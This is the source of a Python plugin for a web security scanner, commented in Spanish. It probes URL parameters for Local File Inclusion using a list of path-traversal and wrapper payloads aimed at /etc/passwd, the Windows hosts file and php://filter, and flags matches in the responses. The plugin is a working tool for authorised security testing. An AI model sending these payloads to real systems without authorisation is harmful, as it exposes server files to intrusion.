#!/usr/bin/env python3
"""plugins/lfi.py - Detección de Local File Inclusion"""

import re
from typing import Dict, List
from core.context import Context

LFI_PAYLOADS = [
    '../../../../etc/passwd',
    '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '/etc/passwd',
    'C:\\windows\\system32\\drivers\\etc\\hosts',
    '../../../../etc/passwd%00',
    '../../../../etc/passwd%00.png',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2f..%2fetc%2fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    'file:///etc/passwd',
    'php://filter/convert.base64-encode/resource=index',
]

LFI_PATTERNS = [
    re.compile(r'root:x:0:0:', re.IGNORECASE),  # /etc/passwd
    re.compile(r'\[drivers\]', re.IGNORECASE),   # hosts file
    re.compile(r'127\.0\.0\.1\s+localhost', re.IGNORECASE),
    re.compile(r'# Copyright.*Microsoft', re.IGNORECASE),  # windows hosts
]


def run(ctx: Context) -> Dict:
    """Ejecuta detección de LFI"""
    target = ctx.target
    findings = []
    
    ctx.log('info', f"Iniciando detección LFI en {target}")
    
    params = ctx.get('discovered_params', [])
    if not params:
        params = [
            {'url': target, 'param': 'file', 'method': 'GET'},
            {'url': target, 'param': 'page', 'method': 'GET'},
            {'url': target, 'param': 'include', 'method': 'GET'},
            {'url': target, 'param': 'path', 'method': 'GET'},
            {'url': target, 'param': 'doc', 'method': 'GET'},
        ]
    
    for param_info in params[:8]:
        if ctx.stopped:
            break
        
        url = param_info['url']
        param = param_info['param']
        method = param_info.get('method', 'GET')
        
        for payload in LFI_PAYLOADS[:6]:
            if ctx.stopped:
                break
            
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
            
            try:
                resp = ctx.req(method, test_url, timeout=10)
                content = resp.text
                
                for pattern in LFI_PATTERNS:
                    if pattern.search(content):
                        findings.append({
                            'type': 'lfi',
                            'severity': 'high',
                            'title': 'Local File Inclusion',
                            'detail': f"Archivo local expuesto via parámetro '{param}'",
                            'evidence': {
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'method': method,
                                'matched': pattern.pattern
                            },
                            'url': test_url
                        })
                        ctx.log('ok', f"LFI detectado en {param}")
                        break
                        
            except Exception as e:
                ctx.log('warn', f"Error probando LFI en {param}: {e}")
    
    return {'findings': findings}


__version__ = "1.0.0"
__author__ = "HT Team"
PHASE = "attack"
REQUIRES = ["crawler"]